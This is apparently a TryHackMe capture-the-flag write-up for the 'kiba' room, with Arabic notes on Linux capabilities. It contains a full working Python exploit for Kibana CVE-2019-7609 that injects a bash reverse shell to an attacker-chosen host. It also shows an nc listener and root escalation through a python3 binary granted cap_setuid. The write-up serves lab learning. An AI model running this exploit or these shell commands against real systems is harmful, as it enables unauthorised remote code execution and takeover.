# TryHackMe kiba Writeup

---

## Nmap Scan

```
nmap -sCV -Pn 10.114.150.121 -p- 
```

```ruby
Host is up (0.54s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5601/tcp open  esmagent

Nmap done: 1 IP address (1 host up) scanned in 0.97 seconds
                                                                   
```

---

```
http://10.114.150.121
```

<img width="1393" height="415" alt="image" src="https://github.com/user-attachments/assets/a512abd2-a92a-4a12-9d1c-f810acbaf3c4" />

```
http://10.114.150.121:5601/
```

<img width="1502" height="530" alt="image" src="https://github.com/user-attachments/assets/8e3de21e-f590-473b-bdc2-fce49fc47f41" />

<img width="1525" height="379" alt="image" src="https://github.com/user-attachments/assets/8aa0e837-eeca-4863-bc23-6fa720f833fe" />

```
CVE-2019-7609 
```

<img width="912" height="115" alt="image" src="https://github.com/user-attachments/assets/a6fec46b-5a81-4435-96be-14c95f3afb3c" />

```
python3 exploit_CVE.py -u http://10.114.150.121:5601/ -host 192.168.137.69 -port 9999 --shell
```

```python
#!/usr/bin/env python
# coding:utf-8
# Build By LandGrey
# Fixed for Python 3

import re
import sys
import time
import random
import argparse
import requests
import traceback
from distutils.version import StrictVersion

def get_kibana_version(url):
    headers = {
        'Referer': url,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    url = "{}{}".format(url.rstrip("/"), "/app/kibana")
    r = requests.get(url, verify=False, headers=headers, timeout=30)
    patterns = ['&quot;version&quot;:&quot;(.*?)&quot;,', '"version":"(.*?)",']
    for pattern in patterns:
        # FIXED: Decode bytes to string
        match = re.findall(pattern, r.content.decode('utf-8'))
        if match:
            return match[0]
    return '9.9.9'

def version_compare(standard_version, compare_version):
    try:
        sc1 = StrictVersion(standard_version[0])
        sc2 = StrictVersion(standard_version[1])
        cc = StrictVersion(compare_version)
    except ValueError:
        print("[-] ERROR : kibana version compare failed !")
        return False

    if sc1 > cc or (StrictVersion("6.0.0") <= cc and sc2 > cc):
        return True
    return False

def verify(url):
    global version

    if not version or not version_compare(["5.6.15", "6.6.1"], version):
        return False
    headers = {
        'Content-Type': 'application/json;charset=utf-8',
        'Referer': url,
        'kbn-version': version,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    data = '{"sheet":[".es(*)"],"time":{"from":"now-1m","to":"now","mode":"quick","interval":"auto","timezone":"Asia/Shanghai"}}'
    url = "{}{}".format(url.rstrip("/"), "/api/timelion/run")
    r = requests.post(url, data=data, verify=False, headers=headers, timeout=20)
    # FIXED: Check response properly
    if r.status_code == 200 and 'application/json' in r.headers.get('content-type', '') and '"seriesList"' in r.text:
        return True
    else:
        return False

def reverse_shell(target, ip, port):
    random_name = "".join(random.sample('qwertyuiopasdfghjkl', 8))
    headers = {
        'Content-Type': 'application/json;charset=utf-8',
        'kbn-version': version,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    # FIXED: Better reverse shell payload
    data = r'''{"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -c \\'bash -i >& /dev/tcp/%s/%s 0>&1\\'\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"10s","timezone":"Asia/Shanghai"}}''' % (ip, port)
    url = "{}{}".format(target, "/api/timelion/run")
    r1 = requests.post(url, data=data, verify=False, headers=headers, timeout=20)
    if r1.status_code == 200:
        trigger_url = "{}{}".format(target, "/socket.io/?EIO=3&transport=polling&t=MtjhZoM")
        new_headers = headers.copy()
        new_headers.update({'kbn-xsrf': 'professionally-crafted-string-of-text'})
        r2 = requests.get(trigger_url, verify=False, headers=new_headers, timeout=20)
        if r2.status_code == 200:
            time.sleep(5)
            return True
    return False

if __name__ == "__main__":
    start = time.time()

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", dest='url', default="http://127.0.0.1:5601", type=str, help='such as: http://127.0.0.1:5601')
    parser.add_argument("-host", dest='remote_host', default="127.0.0.1", type=str, help='reverse shell remote host: such as: 1.1.1.1')
    parser.add_argument("-port", dest='remote_port', default="8888", type=str, help='reverse shell remote port: such as: 8888')
    parser.add_argument('--shell', dest='reverse_shell', action="store_true", help='reverse shell after verify')

    if len(sys.argv) == 1:
        sys.argv.append('-h')
    args = parser.parse_args()
    target = args.url
    remote_host = args.remote_host
    remote_port = args.remote_port
    is_reverse_shell = args.reverse_shell

    target = target.rstrip('/')
    if "://" not in target:
        target = "http://" + target
    
    # Disable SSL warnings
    requests.packages.urllib3.disable_warnings()
    
    try:
        version = get_kibana_version(target)
        print("[*] Detected Kibana version: {}".format(version))
        result = verify(target)
        if result:
            print("[+] {} maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability".format(target))
            if is_reverse_shell:
                print("[*] Attempting reverse shell to {}:{}".format(remote_host, remote_port))
                result = reverse_shell(target, remote_host, remote_port)
                if result:
                    print("[+] Reverse shell sent! Check your listener on {}:{}".format(remote_host, remote_port))
                else:
                    print("[-] Cannot reverse shell - maybe patched or wrong parameters")
        else:
            print("[-] {} does not have CVE-2019-7609 vulnerability".format(target))
    except Exception as e:
        print("[-] Cannot exploit!")
        print("[-] Error: {}".format(str(e)))
        traceback.print_exc()
                                                      
```

<img width="1242" height="287" alt="image" src="https://github.com/user-attachments/assets/2d38cb3b-dde8-46f1-b370-0d5d292bcde1" />

```
nc -lnvp 9999
```

<img width="854" height="211" alt="image" src="https://github.com/user-attachments/assets/222ce3b4-2249-4b1b-8579-0847f9eb9b41" />

---

## I did a quick Google search of “linux capabilities.” To check what capabilities are already existing on the victim machine, type: 

```
getcap -r / 2>/dev/null
```

## results:

<img width="692" height="155" alt="image" src="https://github.com/user-attachments/assets/c52f599d-b7ed-4e29-8a06-82a8a6995aac" />

<details>
  <summary>explain</summary>

🧠 يعني إيه Capabilities أصلاً؟
===============================

في لينكس زمان يا إما:

-   Root = صلاحيات كاملة

-   User = صلاحيات محدودة

لكن دلوقتي فيه نظام اسمه **Capabilities**\
بيسمح تدي برنامج معين "جزء" من صلاحيات الروت\
من غير ما يبقى SUID.

* * * * *

🎯 أهم سطر عندنا هنا 👀
======================

```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
```

🔥🔥🔥 ده كنز.

* * * * *

🧨 يعني إيه cap_setuid+ep ؟
===========================

معناه إن الباينري ده يقدر يغير الـ UID بتاعه.

والأخطر؟

لو عندك `cap_setuid`\
تقدر تخلي نفسك UID 0\
يعني Root 💀

* * * * *

💣 استغلاله إزاي؟
=================

بما إنه Python عنده capability دي\
تقدر تشغل:

```
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

لو اشتغلت...

اعمل:

```
id
```

ولو شفت:

```
uid=0(root)
```

  
</details>

```
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

<img width="1122" height="227" alt="image" src="https://github.com/user-attachments/assets/f342095f-f3c7-4c1a-ab20-716ac27b6b23" />

